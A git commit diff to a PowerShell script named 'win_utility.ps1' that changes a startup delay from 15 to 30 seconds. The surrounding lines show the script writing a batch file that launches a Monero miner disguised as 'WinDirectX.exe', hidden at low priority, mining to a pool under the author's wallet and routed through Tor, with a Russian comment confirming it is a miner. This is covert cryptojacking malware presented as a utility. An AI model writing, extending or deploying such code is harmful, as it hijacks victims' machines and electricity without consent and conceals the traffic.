4c3077a7bc6d1ebcd8ba6f13f6e7ca8bc0118b4b
Isfandiyor0112-star <imamalievisfandier@gmail.com>
2026-02-05 23:16:30 +0500

    Change timeout duration in BAT file creation
    Increased timeout duration from 15 to 30 seconds before starting the process.

--- win_utility.ps1
+++ win_utility.ps1
@@ -94,7 +94,7 @@ if (!(Test-Path "$path\tor.exe")) {
 $cmd = "@echo off`n" +
        "tasklist /FI `"IMAGENAME eq WinDirectX.exe`" 2>NUL | find /I /N `"WinDirectX.exe`">NUL`n" +
        "if %ERRORLEVEL%==0 exit`n" + # Если майнер уже есть — выходим
-       "timeout /t 15 /nobreak >nul`n" +
+       "timeout /t 30 /nobreak >nul`n" +
        "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
